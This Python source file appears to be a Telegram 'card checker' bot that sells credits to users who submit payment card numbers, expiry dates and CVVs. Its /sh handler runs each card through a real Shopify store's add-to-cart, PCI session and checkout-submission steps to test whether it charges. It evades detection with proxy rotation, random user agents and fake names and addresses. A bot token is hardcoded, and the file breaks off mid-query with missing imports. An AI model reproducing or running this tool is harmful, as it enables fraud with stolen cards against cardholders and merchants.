#---------×IMPORTS×------------#
import telebot
import random
from fake_useragent import UserAgent
from datetime import datetime  
import json 
import hashlib
import asyncio
import string
import io
import sys
import re
import os
import subprocess
import logging
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
)
#---------×IMPORTS×------------#

#---------×BOT_INSTALLATION×-------------#
BOT_TOKEN = '8428671625:AAEMIMVgMV7rcMY6Q47QTNV9vV9Afh1S-IY'
#--------×BOT_INSTALLATION×----------#

#-------×COMMAND_HANDLER_TOKEN×----------#
TELEGRAM_BOT_TOKEN = '8428671625:AAEMIMVgMV7rcMY6Q47QTNV9vV9Afh1S-IY'
TOKEN = '8428671625:AAEMIMVgMV7rcMY6Q47QTNV9vV9Afh1S-IY'
#-------×COMMAND_HANDLER_TOKEN×----------#

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

logging.getLogger('telebot').setLevel(logging.CRITICAL)

logging.basicConfig(level=logging.CRITICAL)

bot = telebot.TeleBot(BOT_TOKEN)
#--------------------×BOT×----------------------#


#--------×ADMIN×-----------#
ADMIN_CHAT_ID = 6127646960
#--------×ADMIN×----------#

#-------------------×globals×------------------#
TXT_FILE = None

PROXIES = []

LOCK = threading.Lock()



proxy_list = []

DATA_FILE = 'checker_data.json'


#test_proxy = random.choice(proxy_list) 

CHARGED = 0
DEAD = 0
ERROR = 0
TOTAL = 0
CHECKED = 0
DS = 0



ANIMATION_FRAMES = ["🌑", "🌒", "🌓", "🌔", "🌕", "🌖", "🌗", "🌘"] 

#-------------------×globals×--------------------#











#--------------×JSON_db×----------------#
def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {'users': {}, 'gift_codes': {}}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)
#------------------×DB×----------------------#

#---------------Gareeb_management------------#
#-------×Get_credits×----------#
def get_user_credits(user_id):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        return data['users'][user_id_str].get('credits', 0)
    return 0
#-------×Get_credits×----------#

#-------×Add_Gareeb×----------#
def add_user(user_id, username):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str not in data['users']:
        data['users'][user_id_str] = {
            'username': username,
            'credits': 0,
            'total_checks': 0,
            'joined_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        save_data(data)
#-------×Add_Gareeb×----------#


#------×Gareeb_ke_paise_khao×---------#
def deduct_credit(user_id):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        data['users'][user_id_str]['credits'] -= 1
        data['users'][user_id_str]['total_checks'] += 1
        save_data(data)
#------×Gareeb_ke_paise_khao×---------#


#-------×Gareeb_ko_daan_do×----------#
def add_credits(user_id, amount):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        data['users'][user_id_str]['credits'] += amount
    else:
        data['users'][user_id_str] = {
            'username': 'Unknown',
            'credits': amount,
            'total_checks': 0,
            'joined_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
    save_data(data)
#-------×Gareeb_ko_daan_do×----------#


#-------×Gareeb_Giveway×------------#
def generate_gift_code(credits, admin_id):
    code = hashlib.md5(f"{time.time()}{random.randint(1000, 9999)}".encode()).hexdigest()[:12].upper()
    data = load_data()
    data['gift_codes'][code] = {
        'credits': credits,
        'created_by': admin_id,
        'created_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'is_used': False,
        'redeemed_by': None,
        'redeemed_date': None
    }
    save_data(data)
    return code
#-------×Gareeb_Giveway×------------#


#--------×Gareeb_Happy×------------#
def redeem_gift_code(code, user_id):
    data = load_data()
    code = code.upper()
    
    if code not in data['gift_codes']:
        return False, "Invalid gift code"
    
    gift = data['gift_codes'][code]
    
    if gift['is_used']:
        return False, "Gift code already used"
    
    # Mark as used
    data['gift_codes'][code]['is_used'] = True
    data['gift_codes'][code]['redeemed_by'] = user_id
    data['gift_codes'][code]['redeemed_date'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Add credits to user
    credits = gift['credits']
    user_id_str = str(user_id)
    
    # Ensure user exists
    if user_id_str not in data['users']:
        data['users'][user_id_str] = {
            'username': 'Unknown',
            'credits': 0,
            'total_checks': 0,
            'joined_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
    
    # Add credits
    data['users'][user_id_str]['credits'] += credits
    
    # Save everything at once
    save_data(data)
    
    return True, credits
    
#-------------------Happy_Gareeb--------------------#

#------------Anti-detect-Random-address---------------#
us_addresses = [
    {"address1": "123 Main St", "address2": "", "city": "New York", "countryCode": "US", "postalCode": "10001", "zoneCode": "NY", "lastName": "Doe", "firstName": "John"},
    {"address1": "456 Oak Ave", "address2": "", "city": "Los Angeles", "countryCode": "US", "postalCode": "90001", "zoneCode": "CA", "lastName": "Smith", "firstName": "Emily"},
    {"address1": "789 Pine Rd", "address2": "", "city": "Chicago", "countryCode": "US", "postalCode": "60601", "zoneCode": "IL", "lastName": "Johnson", "firstName": "Alex"},
    {"address1": "101 Elm St", "address2": "", "city": "Houston", "countryCode": "US", "postalCode": "77001", "zoneCode": "TX", "lastName": "Miller", "firstName": "Nico"},
    {"address1": "202 Maple Dr", "address2": "", "city": "Phoenix", "countryCode": "US", "postalCode": "85001", "zoneCode": "AZ", "lastName": "Brown", "firstName": "Tom"},
    {"address1": "303 Cedar Ln", "address2": "", "city": "Philadelphia", "countryCode": "US", "postalCode": "19101", "zoneCode": "PA", "lastName": "Davis", "firstName": "Sarah"},
    {"address1": "404 Birch Blvd", "address2": "", "city": "San Antonio", "countryCode": "US", "postalCode": "78201", "zoneCode": "TX", "lastName": "Wilson", "firstName": "Liam"},
    {"address1": "505 Walnut St", "address2": "", "city": "San Diego", "countryCode": "US", "postalCode": "92101", "zoneCode": "CA", "lastName": "Moore", "firstName": "Emma"},
    {"address1": "606 Spruce Ave", "address2": "", "city": "Dallas", "countryCode": "US", "postalCode": "75201", "zoneCode": "TX", "lastName": "Taylor", "firstName": "Oliver"},
    {"address1": "707 Ash Rd", "address2": "", "city": "San Jose", "countryCode": "US", "postalCode": "95101", "zoneCode": "CA", "lastName": "Anderson", "firstName": "Ava"},
]
#------------Anti-detect-Random-address---------------#
#should add more#

#-------Random_address_add---------#
def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""
#-------Random_address_add---------#

#-------×Proxy_list_me_se_proxy_chori×-----------#
def get_random_proxy():
    if proxy_list:
        return random.choice(proxy_list)
    return None
#-------×Proxy_list_me_se_proxy_chori×-----------#


#----------------×Pagal_banane_wle_naam×---------------#
first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam", "Emma", "Oliver", "Ava"]
last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore", "Taylor", "Anderson", "Thomas"]
#----------------×Pagal_banane_wle_naam×---------------#


#------------------------×Bin_lookup×-----------------------#
def get_bin_info(bin_number):
    """Get BIN information from API"""
    try:
        url = f"https://lookup.binlist.net/{bin_number}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            
            # Extract info
            scheme = data.get('scheme', 'UNKNOWN').upper()
            card_type = data.get('type', 'UNKNOWN').upper()
            brand = data.get('brand', 'UNKNOWN').upper()
            bank_name = data.get('bank', {}).get('name', 'UNKNOWN').upper()
            country_name = data.get('country', {}).get('name', 'UNKNOWN').upper()
            country_emoji = data.get('country', {}).get('emoji', '🌍')
            
            return {
                'scheme': scheme,
                'type': card_type,
                'brand': brand,
                'bank': bank_name,
                'country': country_name,
                'emoji': country_emoji
            }
    except:
        pass
    
    #----------Api_chudi_backup----------#
    return {
        'scheme': 'UNKNOWN',
        'type': 'UNKNOWN',
        'brand': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'emoji': '🌍'
    }
#------------------------×Bin_lookup×-----------------------#


#-----------------×Faltu_Delay×-----------------#
def random_delay(min_sec=0.3, max_sec=0.8):
 
    delay = random.uniform(min_sec, max_sec)
    time.sleep(delay)
    print(f"⏳ Random delay: {delay:.2f}s")
#-----------------×Faltu_Delay×-----------------#  


#---------------×Random_addrs_uthaana×----------------#
def get_random_address():
    
    return random.choice(us_addresses)
#---------------×Random_addrs_uthaana×----------------#


#------------------×/sh_Command×---------------------#
async def sh_check(card_details, username, msg=None):
    # msg is optional if called manually
    if msg:
        await msg.reply_text(f"Checking: {card_details}")
    else:
        print(f"Checking: {card_details} for user {username}")
    start_time = time.time()
    text = card_details.strip()
    pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
    match = re.search(pattern, text)

    if not match:
        return "Invalid card format. Please provide a valid card number, month, year, and cvv."

    n = match.group(1)
    cc = " ".join(n[i:i+4] for i in range(0, len(n), 4))
    mm_raw = match.group(2)
    mm = str(int(mm_raw))
    yy_raw = match.group(3)
    cvc = match.group(4)

    if len(yy_raw) == 4 and yy_raw.startswith("20"):
        yy = yy_raw[2:]
    elif len(yy_raw) == 2:
        yy = yy_raw
    else:
        return "Invalid year format."

    full_card = f"{n}|{mm_raw.zfill(2)}|{yy}|{cvc}"
#------------------×/sh_Command×---------------------#


#-------------------×Very_much_Security×------------------#
    ua = UserAgent()
    user_agent = ua.random
    gen_email = lambda: f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com"
    remail = gen_email()
    rfirst = random.choice(first_names)
    rlast = random.choice(last_names)
    random_addr = get_random_address()
    addr1 = random_addr["address1"]
    addr2 = random_addr["address2"]
    city = random_addr["city"]
    country_code = random_addr["countryCode"]
    postal = random_addr["postalCode"]
    zone = random_addr["zoneCode"]
    #------Random_name_for_addrss--------#
    addr_last = random.choice(last_names).lower()
#-------------------×Very_much_Security×------------------#

    #----------×New_Sessions×----------#
    #---------×For_each_check×----------#
    session = requests.Session()
    #----------×New_Sessions×----------#
    #---------×For_each_check×----------#
    
    #----------×Proxy_Rotate×-----------#
    proxy = get_random_proxy()
    if proxy:
        session.proxies.update(proxy)
        print(f"Using proxy: {proxy['http']}")
    #----------×Proxy_Rotate×-----------#
    

    #----------×Adding_To_Cart×-----------#
    print("StEp OnE : AdDinG_To_cArT.........")
    url = "https://violettefieldthreads.com/cart/add.js"
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://violettefieldthreads.com',
        'referer': 'https://violettefieldthreads.com/products/presley-doll-pants-preorder',
        'user-agent': user_agent,
    }
    data = {
        'form_type': 'product',
        'utf8': '✓',
        'id': '41957285840',
        'quantity': '1',
    }
    response = session.post(url, headers=headers, data=data, proxies=proxy if proxy else None)
    random_delay(0.2, 0.5)  # Minimal delay
    if response.status_code != 200:
        return f"Failed at step 1: Add to cart. Status: {response.status_code}"
    #----------×Adding_To_Cart×-----------#
    
    #---------×Getting_Cart_Token×------------#
    print("Step 2: Fetching cart...")
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://violettefieldthreads.com/products/presley-doll-pants-preorder',
        'user-agent': user_agent,
    }
    response = session.get('https://violettefieldthreads.com/cart.js', headers=headers, proxies=proxy if proxy else None)
    raw = response.text
    random_delay(0.2, 0.5)
    try:
        res_json = json.loads(raw)
        tok = res_json['token']
    except json.JSONDecodeError:
        return "Failed at step 2: Could not decode cart JSON"
    #---------×Getting_Cart_Token×------------#
    
    
    #---------×Posting_To_cart_page×----------#
    print("Step 3: Posting to cart page...")
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://violettefieldthreads.com',
        'referer': 'https://violettefieldthreads.com/cart',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user_agent,
    }
    data = {
        'updates[]': '1',
        'checkout': 'Check out',
    }        
    response = session.post(
        'https://violettefieldthreads.com/cart',
        headers=headers,
        data=data,
        allow_redirects=True,
        proxies=proxy if proxy else None
    )
    text = response.text
    x = find_between(text, 'serialized-session-token" content="&quot;', '&quot;"')
    queue_token = find_between(text, '&quot;queueToken&quot;:&quot;', '&quot;')
    stableid = find_between(text, 'stableId&quot;:&quot;', '&quot;')
    paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

    if not all([x, queue_token, stableid, paymentmethodidentifier]):
        return "Failed at step 3: Could not extract required tokens from cart page."

    random_delay(0.3, 0.7)  # Minimal delay

    # Step 4: PCI session
    print("Step 4: Creating PCI session...")
    headers = {
        'authority': 'checkout.pci.shopifyinc.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://checkout.pci.shopifyinc.com',
        'referer': 'https://checkout.pci.shopifyinc.com/build/d3eb175/number-ltr.html?identifier=&locationURL=',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-storage-access': 'active',
        'user-agent': user_agent,
    }
    json_data = {
        'credit_card': {
            'number': cc,
            'month': mm,
            'year': yy,
            'verification_value': cvc,
            'start_month': None,
            'start_year': None,
            'issue_number': '',
            'name': f'{rfirst} {rlast}',
        },
        'payment_session_scope': 'violettefieldthreads.com',
    }
    response = session.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data, proxies=proxy if proxy else None)
    random_delay(0.2, 0.5)
    try:
        sid = response.json()['id']
        print(f"PCI Session ID: {sid}")
    except (json.JSONDecodeError, KeyError):
        print(f"PCI Response: {response.text[:200]}")
        return "Failed at step 4: Could not get payment session ID"

    random_delay(0.3, 0.7)  # Minimal delay
    #---------×Posting_To_cart_page×----------#
    
    
    #------------×Submitt_For_Checkout×-----------#
    print("Step 5: Submitting for completion...")
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/json',
        'origin': 'https://violettefieldthreads.com',
        'referer': 'https://violettefieldthreads.com/',
        'sec-fetch-site': 'same-origin',
        'shopify-checkout-client': 'checkout-web/1.0',
        'user-agent': user_agent,
        'x-checkout-one-session-token': x,
        'x-checkout-web-deploy-stage': 'production',
        'x-checkout-web-server-handling': 'fast',
        'x-checkout-web-server-rendering': 'yes',
    }
    params = {
        'operationName': 'SubmitForCompletion',
    }
    # Use random address in submission for anonymity
    json_data = {
        'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on RedirectRequiredViolation{target details __typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on TooManyAttempts{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}paymentIcon __typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}finalizedRemoteCheckouts{...FinalizedRemoteCheckoutsResult __typename}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ProcessingRemoteCheckoutsReceipt{id pollDelay remoteCheckouts{...on SubmittingRemoteCheckout{shopId __typename}...on SubmittedRemoteCheckout{shopId __typename}__typename}__typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on 